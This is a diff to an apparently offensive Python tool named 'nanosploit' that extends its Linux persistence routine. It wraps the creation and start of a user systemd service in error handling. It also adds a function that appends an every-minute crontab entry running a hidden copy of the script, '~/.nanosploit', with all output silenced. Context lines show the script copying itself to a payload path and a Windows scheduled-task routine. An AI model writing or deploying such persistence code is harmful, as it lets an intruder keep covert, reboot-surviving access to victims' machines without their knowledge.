@@ -358,18 +358,36 @@ def check_lock() -> bool:
 def create_systemd_service(home_path: str):
     user_service_path = f"{home_path}/.config/systemd/user"
 
-    # Creat systemd service directory
-    if not os.path.exists(user_service_path):
-        os.makedirs(user_service_path)
+    try:
+        # Creat systemd service directory
+        if not os.path.exists(user_service_path):
+            os.makedirs(user_service_path)
 
-    # Write service file
-    with open(f"{user_service_path}/nanosploit.service", "w") as f:
-        f.write(SYSTEMD_UNIT.format(home_path))
+        # Write service file
+        with open(f"{user_service_path}/nanosploit.service", "w") as f:
+            f.write(SYSTEMD_UNIT.format(home_path))
 
-    os.system("systemctl --user enable nanosploit")
-    os.system("systemctl --user start nanosploit")
+        os.system("systemctl --user enable nanosploit")
+        os.system("systemctl --user start nanosploit")
+    except:
+        return False
 
     print("Successfully set systemd service !")
+    return True
+
+
+def crontab_task(home_path: str):
+    # Write crontab scheduled
+    task = f"* * * * * {home_path}/.nanosploit >/dev/null 2>&1"
+
+    # Add task to crontab
+    try:
+        os.system(f'(crontab -l ; echo "{task}") | crontab -')
+    except:
+        return False
+
+    print("Successfully set crontab task !")
+    return True
 
 
 def persistence_linux(persistence: dict):
@@ -381,11 +399,8 @@ def persistence_linux(persistence: dict):
         os.system(f"cp {__file__} {payload_path}")
 
     # Run persistence
-    try:
-        create_systemd_service(home_path)
-        persistence["systemd_service"] = "OK"
-    except:
-        persistence["systemd_service"] = "KO"
+    persistence["systemd_service"] = "OK" if create_systemd_service(home_path) else "KO"
+    persistence["crontab_task"] = "OK" if crontab_task(home_path) else "KO"
 
 
 def create_scheduled_task(payload_path: str):
